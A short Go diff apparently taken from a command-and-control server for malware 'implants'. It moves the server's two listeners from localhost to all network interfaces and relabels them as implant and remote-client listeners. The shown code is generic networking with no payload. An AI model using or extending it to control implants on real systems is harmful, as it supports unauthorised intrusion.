@@ -35,11 +35,12 @@ var (
 )
 
 func main() {
+	//Run Health Checks
 	go healthCheckClients()
 
-	fmt.Println("Starting CLI listener...")
+	fmt.Println("Starting implant listener...")
 
-	ln, err := net.Listen("tcp", "127.0.0.1:8008")
+	ln, err := net.Listen("tcp", "0.0.0.0:8008")
 	if err != nil {
 		fmt.Println("Error listening:", err)
 		return
@@ -48,8 +49,8 @@ func main() {
 
 	go acceptLoop(ln)
 
-	// New listener setup
-	ln2, err := net.Listen("tcp", "127.0.0.1:8009")
+	fmt.Println("Starting remote client listener...")
+	ln2, err := net.Listen("tcp", "0.0.0.0:8009")
 	if err != nil {
 		fmt.Println("Error listening on second port:", err)
 		return
